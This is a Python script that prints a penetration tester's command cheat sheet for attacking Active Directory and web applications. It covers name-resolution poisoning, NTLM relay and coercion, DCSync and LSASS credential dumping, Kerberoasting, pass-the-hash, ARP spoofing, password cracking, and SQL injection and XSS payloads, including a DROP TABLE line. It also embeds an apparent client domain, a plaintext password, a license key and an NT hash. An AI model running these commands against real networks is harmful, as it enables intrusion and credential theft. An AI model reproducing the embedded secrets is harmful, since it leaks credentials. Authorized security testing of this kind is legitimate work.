#! /bin/python3

# Script intended to display on screen those commonly used commands during Penetration Tests and
# Red Team exercises (not comprehensive, just those I use the most)
# SQL and XSS the most basic.
# Need to update domain, url and interface for each engagement.
# November 2024
# Updated November 2025

import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Define variables for <domain>, <url> and <interface>
domain = "ad.parsebiosciences.com"   # Replace with your desired domain
interface = "eth0"   # Replace with your desired interface
url = "website.com"    # Replace with your desired URL
gateway = "10.30.1.1"      # Replace with your desired gateway

# Define the commands and descriptions
commands = {
    "pretender": [
        f"Analyze Mode: sudo ./pretender -i {interface} --dry",
        f"Poisoning Mode: sudo ./pretender -i {interface}",
    ],
    "responder": [
        f"Analyze Mode: sudo responder -I {interface} -A",
        f"Poisoning Mode: sudo responder -I {interface} -Pdv",
    ],
    "mitm6": [
        f"Basic: sudo mitm6 -d {domain}",
        f"If we get a machine added [IMPERSONATE]: getST.py -spn cifs/targetcomputer {domain}/<ouraddedcomputer> -impersonate <domainAdmin>",
        "Test Access (may need to add domain to machine name): smbclient -k //targetcomputer/c$ (may need to generate out.ccache)",
        f"DCSync: secretsdump.py -k -no-pass targetcomputer.{domain} ",
    ],
    "nxc": [
        "List Available Modules: nxc {smb/ldap/wmi} -L",
        "Basic Command Execution: nxc smb <target> -u username -p password -x command",
        "Local Authentication: nxc smb <target> -u username -p password --local-auth",
        "SMB Enumeration: nxc smb <target> -u username -p password --shares",
        "SMB Signing Check: nxc smb <target(s)> --gen-relay-list <outputfile>",
        "Bloodhound Ingestion: nxc ldap <target> -u username -p password --bloodhound --collection All",
        "COERCION: nxc smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M coerce_plus -o LISTENER=MY_IP ALWAYS=true",
        "LDAP Enumeration: nxc ldap <target> -u username -p password --users",
        "Dump LSA Secrets: nxc smb <target> -u username -p password --local-auth --lsa",
        "LSASSY: nxc smb <target> -u <user> -H <hash>/<pass> -M lsassy --local-auth (lsa secrets clear)",
        "NANODUMP: nxc smb <target> -u username -p password -M nanodump",
        "Interesting on DCs: nxc smb -M {zerologon, coerce_plus (petitpotam), spooler, --pass-pol…}",
        "Find ADCS servers: nxc ldap <target> -u username -p password -M adcs",
        "Find ADCS templates: nxc ldap <target> -u username -p password -M certipy-find",
        "WMI Command Execution: nxc wmi <target> -u username -p password -x command",
        "Kerberoasting: nxc ldap <target> -u username -p password --kerberoasting <outputfile>",
        "ASREProast: nxc ldap <target> -u username -p password --asreproast <outputfile>",
        "Password Spraying: nxc smb <target> -u users.txt -p password --continue-on-success --no-bruteforce",
        "Spider_plus Module: nxc smb <target> -u username -p password -M spider_plus",
        "MSSQL Command Execution: nxc mssql <target> -u username -p password -x command",
        "RDP Execution: nxc rdp <target> -u username -p password -x command",
        "FTP Listing: nxc ftp <target> -u username -p password --ls",
        "User Enum RID Brute: nxc smb <DC> -u 'guest' -p '' --rid-brute",
        "Credential Dumping via ADCS (Admin needed): nxc smb <target> -u username -p password -M masky",
        "Impersonate any user: nxc smb <target> -u username -p password -M impersonate",
    ],
    "OSINT": [
        "Subdomain Enum: finalrecon --sub --url https://<target>",
        "Subdomain Enum: nmap --script hostmap-crtsh --script-args 'hostmap-crtsh.prefix=hostmap-crtsh' <target> -oN nmap.txt",
        "Subdomain Enum: subfinder -d <target> -o subfinder.txt",
        "Subdomain Enum: sublist3r -d <target> -o sublist3r.txt",
        "Subdomain Enum: ~/Documents/misc/znotes/cert.py <target> > cert.txt",
        "Subdomain Enum: assetfinder -subs-only <target> | tee assetfinder.txt [.json!!!]",
        "Subdomain Enum: amass enum -d <target> -o amass.txt [RUN_LAST!!!]",
        "Automated Enum: https://dnsdumpster.com/",
        "Automated Enum: dnstwist -a <target> -f csv -o dnstwist.csv",
        "Automated Enum: theHarvester -d <target> -b all -f theHarvester.txt",
        "Automated Enum: echo <target> | nrich - | tee -a nrich.txt ||| OR nrich hosts.txt",
        "Automated Enum: echo '<target>' | httpx-toolkit -tech-detect -silent -fr",
        "Automated Enum: bbot -t <target> -f subdomain-enum",
    ],
    "tmux": [
        "New Session: tmux new -s <session-name>",
        "List Sessions: tmux list-sessions",
        "Attach Session: tmux attach-session -t <session-name>",
        "Detach Session (No Prefix): Ctrl + D ",
        "Capture Pane to File: tmux capture-pane -pS - > ~/pane_output.txt",
        "Reload Source File (After Changes): source-file ~/.tmux.conf",
    ],
    "Sortable_IPs": [
        """Formula: =TEXT(LEFT(A1,FIND(".",A1,1)-1),"000") & "." & TEXT(MID(A1,FIND( ".",A1,1)+1,FIND(".",A1,FIND(".",A1,1)+1)-FIND(".",A1,1)-1),"000") & "." & TEXT(MID(A1,FIND(".",A1,FIND(".",A1,1)+1)+1,FIND(".",A1, FIND(".",A1,FIND(".",A1,1)+1)+1)-FIND(".",A1,FIND(".",A1,1)+1)-1), "000") & "." & TEXT(RIGHT(A1,LEN(A1)-FIND(".",A1,FIND(".",A1,FIND( ".",A1,1)+1)+1)),"000")""",
    ],
    "Docker_Bloodhound_CE": [
        "Install Step 1: mkdir /opt/bloodhoundce && cd /opt/bloodhoundce",
        "Install Step 2: sudo apt update",
        "Install Step 3: sudo apt install -y docker.io docker-compose",
        "Install Step 4: wget https://ghst.ly/getbhce -O docker-compose.yml",
        "Install Step 5: sudo docker-compose up",
        "Login: http://localhost:8080",
        "Email: admin",
        "Password: 2026-05-11 => Wapiti2026!!",
        "to start: docker-compose up",
        "to stop: docker-compose down",
        "To wipe database 1: docker compose down",
        "To wipe database 2: docker volume ls",
        "To wipe database 3: docker volume rm bloodhound-ce_neo4j_data",
        "To wipe database 4: docker compose up",
    ],
    "pcredz": [
        f"Basic: sudo pcredz -i {interface} -v",
        "If using alias: Logs are saved at ~/tools/PCredz/CredentialDump-Session.log",
        "REMEMBER: echo 1 > /proc/sys/net/ipv4/ip_forward",
    ],
    "ettercap": [
        f"Basic: sudo ettercap -T -q -i {interface} -p -M arp:remote /{gateway}// /10.z.z.100-200//",
         "REMEMBER: echo 1 > /proc/sys/net/ipv4/ip_forward",
    ],
    "bloodhound": [
        f"With Password Legacy: bloodhound-python -u user -p password -ns <DC_IP> -d {domain} -c All",
        f"With Password (Community Edition): bloodhound-ce-python -u user -p password -ns <DC_IP> -d {domain} -c All",
        f"With Password (RUSTHOUND): rusthound-ce -d {domain} -u user -p password -f <dc-fqdn> -c All -z",
        f"With ccname (RUSTHOUND): rusthound-ce -d {domain} -c All -k -f <dc-fqdn> -z",
        f"With Hash: bloodhound-python -u user --hashes :f085377618fea2f786ea84f1abd08c8e -ns <DC_IP> -d {domain} -c All",
    ],
    "kerberoast": [
        f"With password: GetUserSPNs.py {domain}/<User>:<Password> -request",
        f"With Hash: GetUserSPNs.py -dc-ip <DC_IP> -hashes :f085377618fea2f786ea84f1abd08c8e {domain}/<User> -request",
        "REMEMBER: Need credentials!",
    ],
    "nessus": [
        "Installation: sudo apt install ./nessus.deb",
        "Start: sudo systemctl start nessusd",
        "Stop: sudo systemctl stop nessusd",
        "Add User: sudo /opt/nessus/sbin/nessuscli adduser",
        "Register License: sudo /opt/nessus/sbin/nessuscli fetch --register L2DQ-JGP2-4CF4-7LE7",
        "Update Pluggins: sudo /opt/nessus/sbin/nessuscli update --all",
        "Check logs messages: sudo tail -f /opt/nessus/var/nessus/logs/nessusd.messages",
    ],
    "h8mail": [
        "Basic: h8mail -t @<target> -sk -lb ./CompilationOfManyBreaches/ --loose",
    ],
    "Kr": [
        "Basic: ./kr scan <URL> -w ./routes-large.kit",
        "REMEMBER: This is done in /opt/",
    ],
    "SCP": [
        "From remote Host to local Kali: scp <myuserid>@host:/absolutepath/file .",
        "From local Kali to remote Host: scp /path/to/local_file <myuserid>@host:/path/to/remote_destination",
    ],
    "smbmap": [
        "List Shares (with detailed info): smbmap -H <target_ip> -d",
        "List Users on the Target: smbmap -H <target_ip> -u",
        "Check for NULL sessions: smbmap -H <target_ip> --null",
        f"Sample Execution: smbmap -u user -p password -d {domain} -x 'net group Domain_Admins /domain' -H <IP>",
    ],
    "smbclient": [
        "List Shares: smbclient -L <target_ip>",
        "Connect to Share and List Contents: smbclient //<ip>/<share_name> -U username", 
        "Download File from Share: smbclient //<ip>/<share_name> -U username -c 'get <remote_file> <local_file>'",
        "Note: If in control of KRB5CCNAME=<ticket>.cache -> smbclient -k //targetcomputer.doman/c$",
    ],
    "SQL": [
        "Payload: ' OR '1'='1",
        "Payload: ' OR 1=1;--",
        "Payload: ' OR 1=1--",
        "Payload: ' OR 'x'='x",
        "Payload: **' OR 1=1;--",
        "Payload: **' OR 1=1; DROP TABLE users--",
        "Payload: **' OR 1=1; SELECT * FROM users--",
        "Payload: **' OR 1=1; UNION SELECT username, password FROM users--",
        "Payload: **' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'password')--",
    ],
    "evil-winrm": [
        "With Password: evil-winrm -i <target_ip> -u username -p password",
        "With Hash: evil-winrm -i <target_ip> -u username -H <nt_hash>",
        "Execute Commands: evil-winrm -i <target_ip> -u username -p password -x <command>",
    ],
    "certipy": [
        f"Finds Vulnerable ADCS Servers & Templates: certipy find -dc-ip <IP> -u username@{domain} -p password -vulnerable -enabled",
        f"Authenticates and gets you the cert: certipy auth -username username -domain {domain} -dc-ip <IP> -pfx <Certificate_Name>",
        "REMEMBER: Installation pipx install certipy-ad",
        "REMEMBER: auth used after Coerse, Petitpotam, DFSCoerse {.pfx file}",
    ],
    "wmiexec": [
        f"Basic: wmiexec.py {domain}/username:password@<IP> -dc-ip <IP> -shell-type powershell",
    ],
     "PKINIT": [
        f"Basic: python gettgtpkinit.py {domain}/username -cert-pfx <certificateFile> <out.ccache>",
        "REMEMBER: Used after Coerse, Petitpotam, DFSCoerse {.pfx file}",
    ],
    "WebApp_ToDo_List": [
        "Test Item: Nessus",
        "Test Item: commix (command Injection)",
        "Test Item: wfuzz and ffuf",
        "Test Item: xsstrike",
        "Test Item: Autorecon",
        "Test Item: Whatweb",
        "Test Item: Burp",
        "Test Item: Nmap",
        "Test Item: kr (API's)",
        "Test Item: Ferox",
        "Test Item: Nikto",
        "Test Item: uniscan",
        "Test Item: Wapiti",
        "Test Item: Hunt for error messages / technologies",
        "Test Item: Register accounts",
        "Test Item: Duplicate sesssion",
        "Test Item: Token reuse",
        "Test Item: CORS",
        "Test Item: Database collisions",
        "Test Item: Authorize plugin Burp",
        "Test Item: API",
        "Test Item: sqlmap",
        "Test Item: EICAR test file",
    ],
    "IPT_ToDo_List": [
        "Test Item: Install UV!!",
        "Test Item: Install httpie",
        "Test Item: Autorecon!?",
        "Test Item: Certipy can relay (like ntlmrelayx to cath the coercion!)",
        "Test Item: ligolo-ng (pivoting!)",
        "Test Item: nmap for webports",
        "Test Item: webports to eyewitness",
        "Test Item: Nessus",
        "Test Item: subnets (nxc)",
        "Test Item: kerberoastables",
        "Test Item: lsassy",
        "Test Item: ARP",
        "Test Item: llmnr/netbios/mdns",
        "Test Item: bloodhound",
        "Test Item: mitm6",
        "Test Item: ADCS",
        "Test Item: pre2k",
        "Test Item: nopac",
        "Test Item: coercion ",
        "Test Item: spooler",
        "Test Item: null auth on DC",
        "Test Item: nxc relay list & nxc stuff (guest, anonymous, etc) ",
        "Test Item: timeroast",
        "Test Item: aseproast",
        "Test Item: get network output.",
        "Test Item: ntlrmrelayx pointing to ldap on DCs",
        "Test Item: targetkerberoast value target?",
        "Test Item: create computers",
    ],
    "Virtual_Environments_Python": [
        "Navigate to your project directory: # cd your_project_directory",
        "Create the virtual environment: # python3 -m venv .virtual",
        "Activate: # source .virtual/bin/activate",
        "Deactivate: # deactivate",
        "To Find them: find ~ -type f -name 'activate'",
    ],
    "ASREPRoasting": [
        f"With Credentials: GetNPUsers {domain}/<username>:<password> -request -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt",
        f"Without Credentials: GetNPUsers.py {domain}/ -dc-ip <IP> -usersfile user.txt -format hashcat -outputfile asrep_output.txt -no-pass",   
    ],
    "ntlmrelayx": [
        "Responder Mode: sudo ntlmrelayx -tf targets.txt -smb2support -of output.txt",
        f"IPv6 Mode: sudo ntlmrelayx -6 -wh wwpadfile.{domain} -t ldaps://<Target> -l <loot_folder> --delegate-access -smb2support",
        f"IPv6 Mode 2: sudo ntlmrelayx -6 -wh wwpadfile.{domain} -t smb://<TARGET_IP> -smb2support",
        "ADCS Mode (gets the pfx file): ntlmrelayx -t http://<IP>/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'",
        "REMEMBER: Note that responder.conf need to have both SMB and HTTP off",
        "REMEMBER: ntlmrelayx doesn't save logs by default, make sure to specify it with a flag",
    ],
    "coercer": [
        "Coerce Mode: sudo coercer coerce -u username -p password --target-ip <IP> --listener-ip <IP>",
        "Scan Mode: sudo coercer scan -u username -p password --target-ip <IP>",
        "REMEMBER: relay with ntlmrelayx on ADCS mode if ADCS servers found!",
        "REMEMBER: ntlmrelayx in ADCS mode generates the .pfx file",
        "REMEMBER: You may also use PKINIT tools or certipy for the .pfx file",
    ], 
    "DFSCoerce": [
        f"Basic: DFSCoerce -u username -p password -d {domain} -l <listener_IP> -t <dc_IP>",
        "REMEMBER: You may use PKINIT tools or certipy for the .pfx file",
        "REMEMBER: relay with ntlmrelayx or capture via Responder"
    ],
    "PetitPotam": [
        "python3 Petitpotam.py <listener_IP> <target_(DC)>",
        "REMEMBER: You may use PKINIT tools or certipy for the .pfx file",
        "REMEMBER: relay with ntlmrelayx or capture via Responder"
    ], 
    "ADCSHunter": [
        "Installation: git clone https://github.com/danti1988/adcshunter.git",
        "Basic: python3 adcshunter.py -t <Range>",
    ], 
    "enum4linux": [
        f"Full Enum: enum4linux -a -u username -p password -w {domain} <DC_IP>",
        f"Basic Groups: enum4linux -u username -p password -w {domain} -G <DC_IP> | tee output.txt",
        f"Basic Users: enum4linux -u username -p password -w {domain} -U <DC_IP> | tee output.txt",
    ], 
    "secretsdump": [
        f"Admin Account Needed: secretsdump {domain}/username:password@<DC_IP> -outputfile dcsync.txt",
    ], 
    "ike-scan": [
        "Detect Aggressive Mode: ike-scan -A --id=root@none.com <target>",
    ], 
    "nmap": [
        "Host Discovery (may be prone to false positives): nmap -Pn -sn <range>",
        "SSH algorithms: nmap --script ssh2-enum-algos <target_ip>",
        "Convert to HTML: xsltproc <nmap>.xml -o <nmap>.html",
    ], 
    "mssqlclient": [
        "Basic: mssqlclient.py username@<target_ip> -p <port> -windows-auth",
    ], 
    "FUFF": [
        f"Basic: ffuf -u http://{url}/FUZZ -w <wordlist>",
        f"Advanced with Extensions: ffuf -u http://{url}/FUZZ -w <wordlist> -e .php,.html,.txt",
        f"Fuzzing with Status Codes: ffuf -u http://{url}/FUZZ -w <wordlist> -fc 404,403 -o results.json -of json",
        f"Fuzzing with Recursion: ffuf -u http://{url}/FUZZ -w <wordlist> -recursion -o results.json -of json",
        f"Fuzzing Headers: ffuf -u http://{url}/FUZZ -w <wordlist> -H 'Host: target.com' -o results.json -of json",
    ], 
    "WFUZZ": [
        f"Basic: wfuzz -w <wordlist> -c http://{url}/FUZZ -o results.txt",
        f"Specify Response codes to include: wfuzz -w <wordlist> -c --sc 200,301,302 http://{url}/FUZZ -o results.txt",
        f"Enable Recursion: wfuzz -w <wordlist> -c -recursion http://{url}/FUZZ -o results.txt",
        f"Filter Out Response Codes: wfuzz -w <wordlist> -c -fc 404,403 http://{url}/FUZZ",
    ], 
    "XSS": [
        """Payload: <script>alert('XSS')</script>""",
        """Payload: <img src="javascript:alert('XSS')"/>""",
        """Payload: <div style="background:url(javascript:alert('XSS'))">""",
        """Payload: <a href="javascript:alert('XSS')">Click me</a>""",
        """Payload: <iframe src="javascript:alert('XSS')"></iframe>""",
        """Payload: <body onload="javascript:alert('XSS')">""",
        """Payload: <object data="javascript:alert('XSS')"></object>""",
        """Payload: <svg/onload="javascript:alert('XSS')"></svg>""",
        """Payload: <input type="text" onfocus="javascript:alert('XSS')"/>""",
    ],
    "hashcat": [
    "NTLMv2: hashcat -m 5600 -a0 <file> /hashcat/dic/FinalFinal.txt -w 2 -O",
    "NTLMv2: hashcat -m 5600 --session <SessionName> -a0 <file> /hashcat/dic/FinalFinal.txt -w 2 -O -r /usr/share/hashcat/rules/best64.rule",
    "NTLMv2: hashcat -m 5600 --session <SessionName> -a0 <file> /hashcat/dic/FinalFinal.txt -w 2 -O -r /usr/share/hashcat/rules/d3ad0ne.rule",
    "Restore a Session: hashcat --restore --session <SessionName>",
    "NTLMv1: hashcat -m 1000 -a0 <file> /hashcat/dic/FinalFinal.txt -w 2 -O",
    "Kerberos 5: hashcat -m 13100 -a0 <file> /hashcat/dic/FinalFinal.txt -w 2 -O",
    "Domain Cached Credentials DCC: hashcat -m 1100 -a0 <file> /hashcat/dic/FinalFinal.txt -w 2 -O",
    ],
}

# Function to colorize the explanation part of a command
def colorize_command(command):
    parts = command.split(": ", 1)  # Split into explanation and the rest of the command
    if len(parts) == 2:
        explanation, details = parts
        return f"{Fore.GREEN}{explanation}:{Style.RESET_ALL} {details}"
    return command

# Function to colorize the explanation part of a command
def colorize_command(command: str) -> str:
    if command.startswith("REMEMBER:"):
        return f"{Fore.RED}{command}{Style.RESET_ALL}"
    parts = command.split(": ", 1)
    if len(parts) == 2:
        explanation, details = parts
        return f"{Fore.GREEN}{explanation}:{Style.RESET_ALL} {details}"
    return command

def main():
    parser = argparse.ArgumentParser(description="Command Listing Script")
    parser.add_argument("argument", nargs="?", help="The command argument (e.g., responder, nmap) to retrieve commands for")
    parser.add_argument("-l", "--list", action="store_true", help="List all available arguments")
    args = parser.parse_args()

    # Build a case-insensitive mapping for lookup
    lookup = {k.lower(): k for k in commands.keys()}

    # List all available arguments (alphabetically)
    if args.list:
        print("Available arguments:")
        for arg in sorted(commands.keys(), key=lambda s: s.lower()):
            print(f"- {Fore.CYAN}{arg}{Style.RESET_ALL}")
        return

    # Get the commands for the specified argument (case-insensitive)
    if args.argument:
        arg_l = args.argument.lower()
        if arg_l in lookup:
            real_key = lookup[arg_l]
            print(f"Commands for {real_key}:")
            for command in commands[real_key]:
                print(f"- {colorize_command(command)}")
        else:
            print(f"No commands found for argument: {args.argument}")
    else:
        print("No argument provided. Use -l or --list to view all available arguments.")

if __name__ == "__main__":
    main()
